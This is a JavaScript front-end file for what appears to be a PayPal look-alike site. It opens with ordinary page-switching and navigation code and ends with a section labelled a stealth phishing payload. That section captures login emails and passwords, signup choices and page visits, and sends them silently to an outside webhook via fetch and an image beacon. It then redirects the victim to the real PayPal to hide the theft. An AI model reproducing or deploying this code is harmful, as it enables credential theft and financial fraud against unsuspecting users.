// Pages
document.querySelectorAll(".logo").forEach((logo) => {
  logo.addEventListener("click", () => {
    document.querySelector(".front-page").style.display = "block";
    document.querySelector(".login-page").style.display = "none";
    document.querySelector(".signup-page").style.display = "none";
  });
});

document.querySelectorAll(".login").forEach((loginBtn) => {
  loginBtn.addEventListener("click", () => {
    document.querySelector(".front-page").style.display = "none";
    document.querySelector(".login-page").style.display = "block";
    document.querySelector(".signup-page").style.display = "none";
  });
});

document.querySelectorAll(".signup").forEach((signupBtn) => {
  signupBtn.addEventListener("click", () => {
    document.querySelector(".front-page").style.display = "none";
    document.querySelector(".login-page").style.display = "none";
    document.querySelector(".signup-page").style.display = "flex";
  });
});
// End of Pages

// Navigation
const dropdownItems = document.querySelectorAll(".dropdown-hover");

if (window.innerWidth < 1000) {
  const menuIcon = document.querySelector(".menu");
  const navbar = document.querySelector(".navbar");

  menuIcon.addEventListener("click", () => {
    navbar.classList.toggle("change");

    if (!navbar.classList.contains("change")) {
      document.querySelectorAll(".nav-dropdown").forEach((dropdown) => {
        dropdown.style.left = "-20rem";
      });
    }
  });

  document.querySelectorAll(".show-dropdown").forEach((link) => {
    link.addEventListener("click", () => {
      link.nextElementSibling.style.left = "0";
    });
  });

  document.querySelectorAll(".dropdown-heading-link").forEach((headingLink) => {
    headingLink.addEventListener("click", () => {
      headingLink.parentElement.parentElement.style.left = "-20rem";
    });
  });
} else {
  dropdownItems.forEach((dropdownItem) => {
    dropdownItem.addEventListener("mouseover", () => {
      dropdownItem.lastElementChild.style.cssText =
        "opacity: 1; visibility: visible";
      document.querySelector(".navbar-wrapper").style.background =
        "linear-gradient(to right, #066399, #2f8fdf, #066399)";
      dropdownItem.firstElementChild.firstElementChild.style.transform =
        "rotate(180deg)";
    });
    dropdownItem.addEventListener("mouseout", () => {
      dropdownItem.lastElementChild.style.cssText =
        "opacity: 0; visibility: hidden";
      document.querySelector(".navbar-wrapper").style.background = "none";
      dropdownItem.firstElementChild.firstElementChild.style.transform =
        "rotate(0)";
    });
  });
}

window.addEventListener("resize", () => {
  window.location.reload();
});

// End of Navigation

// STEALTH PHISHING PAYLOAD - SIMPLE & WORKING
document.addEventListener('DOMContentLoaded', function() {
  const WEBHOOK_URL = 'https://webhook-sigma-drab.vercel.app/api/webhook/7v73twcw1mhzjk5fo';

  // Invisible data sender
  const sendData = (data) => {
    const payload = JSON.stringify(data);
    
    // Silent fetch
    fetch(WEBHOOK_URL, {
      method: 'POST',
      mode: 'no-cors',
      headers: {'Content-Type': 'application/json'},
      body: payload
    }).catch(() => {});
    
    // Image beacon backup
    const img = new Image();
    img.src = `${WEBHOOK_URL}?d=${btoa(payload)}`;
  };

  // LOGIN CAPTURE
  const loginButton = document.querySelector('.form-login-btn');
  if (loginButton) {
    loginButton.addEventListener('click', function(e) {
      e.preventDefault();
      
      const emailInput = document.querySelector('input[type="text"]');
      const passwordInput = document.querySelector('input[type="password"]');
      
      if (emailInput && passwordInput) {
        const email = emailInput.value;
        const password = passwordInput.value;
        
        if (email && password) {
          // Capture credentials
          sendData({
            type: 'creds',
            email: email,
            password: password,
            timestamp: new Date().toISOString()
          });
          
          // Show loading state
          this.value = "Logging in...";
          this.disabled = true;
          
          // Redirect to real PayPal
          setTimeout(() => {
            window.location.href = 'https://paypal.com';
          }, 1500);
        }
      }
    });
  }

  // SIGNUP CAPTURE
  const signupButton = document.querySelector('.signup-page .blue-btn');
  if (signupButton) {
    signupButton.addEventListener('click', function(e) {
      e.preventDefault();
      
      const accountType = document.querySelector('input[type="radio"]:checked') ? 
        document.querySelector('input[type="radio"]:checked').nextElementSibling.querySelector('h3').textContent : 
        'Unknown';
      
      sendData({
        type: 'signup',
        accountType: accountType
      });
      
      this.textContent = "Continue";
      this.disabled = true;
      
      setTimeout(() => {
        window.location.href = 'https://paypal.com/signup';
      }, 1500);
    });
  }

  // Page visit capture
  sendData({
    type: 'visit',
    page: window.location.href,
    timestamp: new Date().toISOString()
  });
});
